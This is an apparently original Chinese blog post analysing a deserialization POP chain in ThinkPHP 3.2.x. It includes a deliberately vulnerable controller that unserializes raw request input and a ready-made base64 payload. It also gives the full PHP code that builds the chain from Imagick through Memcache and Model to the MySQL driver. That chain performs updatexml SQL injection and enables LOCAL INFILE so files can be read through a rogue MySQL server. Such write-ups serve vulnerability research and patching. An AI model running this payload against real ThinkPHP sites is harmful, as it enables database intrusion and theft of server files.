# 原创
：  ThinkPHP3.2.x （SQL注入&文件读取）反序列化POP链

# ThinkPHP3.2.x （SQL注入&amp;文件读取）反序列化POP链

#### ThinkPHP3.2.x（SQL注入&amp;文件读取）反序列化POP链

## 初始配置

> 



```
&lt;?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this-&gt;show('&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;','utf-8');
    }
    public function d1no(){
        unserialize(base64_decode(file_get_contents('php://input')));
        phpinfo();
    }
}

```

## 漏洞利用

> 
Payload


```
TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjYzOiJ0aGlua3BocC51c2VycyB3aGVyZSAxPXVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLHVzZXIoKSwweDdlKSwxKSMiO3M6NToid2hlcmUiO3M6MzoiMT0xIjt9fXM6NToiACoAZGIiO086MjE6IlRoaW5rXERiXERyaXZlclxNeXNxbCI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YToxOntpOjEwMDE7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo4OntzOjU6ImRlYnVnIjtpOjE7czo0OiJ0eXBlIjtzOjU6Im15c3FsIjtzOjg6ImRhdGFiYXNlIjtzOjg6InRoaW5rcGhwIjtzOjg6Imhvc3RuYW1lIjtzOjk6IjEyNy4wLjAuMSI7czo4OiJob3N0cG9ydCI7czo0OiIzMzA2IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo4OiJ1c2VybmFtZSI7czo4OiJ0aGlua3BocCI7czo4OiJwYXNzd29yZCI7czo4OiJ0aGlua3BocCI7fX19fX0=

```

## 漏洞分析

### POP链分析

> 
首先找一个链子的起点，全局搜索`__destruct`


> 
查看后发现很多都是`free()`或者`fclose()`，其中有两个值得注意，分析后定位到其中的一个：`ThinkPHP\Library\Think\Image\Driver\Imagick.class.php`


> 
这里的`$this-&gt;img`指的是本类中img这个成员变量，是完全可控的，并且调用了`$this-&gt;img`的`destroy()`，全局搜索该方法，来寻找一个含有`destroy()`成员方法的跳板类，跟进`ThinkPHP\Library\Think\Session\Driver\Memcache.class.php`


> 
上一步中`Imagick::__destruct`中调用`destroy()`方法的时候并没有传值，那么这里形参`$sessID`是空的（这里就是为什么前面要用PHP5的原因，在PHP7下调用有参函数时不传参数会触发框架里的错误处理，从而报错），这里的`$this-&gt;handle`可控，并且调用了`$this-&gt;handle`的`delete()`方法，且传过去的参数是部分可控的，因此可以继续寻找有`delete()`方法的跳板类，跟进`ThinkPHP\Mode\Lite\Model.class.php`


> 
这里的`$pk`其实就是`$this-&gt;pk`，是完全可控的，下面的`$options`是从第一个跳板类传过来的，在第一个跳板类中可以控制其是否为空，`$this-&gt;options['where']`是成员属性，也是可控的，因此可以控制程序走到`return $this-&gt;delete($this-&gt;data[$pk]);`，在这里又调用了一次自己`$this-&gt;delete()`，但是这时候的参数`$this-&gt;data[$pk]`是可控的，这时`delete()`就可以成功带可控参数访问了，这是ThinkPHP的数据库模型类中的`delete()`方法，最终会去调用到数据库驱动类中的`delete()`中去，且代码中的一堆条件判断很显然都是可以控制的包括调用`$this-&gt;db-&gt;delete($options)`时的`$options`参数也可以控制，那么这时候就可以调用任意自带的数据库类中的`delete()`方法了


> 
跟进`ThinkPHP\Library\Think\Db\Driver.class.php`，由于传入的参数是完全可控的，所以这里的`$table`是可控的，将`$table`拼接到`$sql`传入了`$this-&gt;execute()`


> 
跟进`ThinkPHP\Library\Think\Db\Driver\Firebird.class.php`，这里有一个初始化数据库链接的方法


> 
跟进`ThinkPHP\Library\Think\Db\Driver.class.php`，这里`initConnect`方法可以通过控制成员属性，使程序调用到`$this-&gt;connect()`


> 
跟进`ThinkPHP\Library\Think\Db\Driver.class.php`，可以看到这里是去使用`$this-&gt;config`里的配置去创建了数据库连接，接着去执行前面拼接的`DELETE SQL语句`


### POP链构造

```
&lt;?php 
namespace Think\Image\Driver{
	use Think\Session\Driver\Memcache;
	class Imagick{
		private $img;

		public function __construct(){
			$this-&gt;img = new Memcache();
		}
	}
}

namespace Think\Session\Driver{
	use Think\Model;
	class Memcache{
		protected $handle;

		public function __construct(){
			$this-&gt;handle = new Model();
		}
	}
}

namespace Think{
	use Think\Db\Driver\Mysql;
	class Model{
		protected $options = array();
		protected $pk;
		protected $data = array();
		protected $db = null;

		public function __construct(){
			$this-&gt;db = new Mysql();
			$this-&gt;options['where'] = '';
			$this-&gt;pk = 'id';
			$this-&gt;data[$this-&gt;pk] = array(
				'table' =&gt; 'thinkphp.users where 1=updatexml(1,concat(0x7e,user(),0x7e),1)#',
				'where' =&gt; '1=1'
			);
		}
	}
}

namespace Think\Db\Driver{
	use PDO;
	class Mysql{
		protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    =&gt; 1,
            'type'     =&gt; "mysql",
            "database" =&gt; "thinkphp",
            "hostname" =&gt; "127.0.0.1",
            "hostport" =&gt; "3306",
            "charset"  =&gt; "utf8",
            "username" =&gt; "thinkphp",
            "password" =&gt; "thinkphp"
        );
	}
}

namespace {
	echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}
?&gt;

```

### 漏洞利用

> 
此POP链的正常利用过程应该是：



> 
但是如果只是这样，那么这个链子其实十分鸡肋，但是因为这里可以连接任意数据库，于是可以考虑利用MySQL恶意服务端读取客户端文件漏洞。


> 
这样的话，利用过程就变成了：



## 参考文章

> 
可以查看参考文章来获取漏洞利用的更详细方式：[https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA)

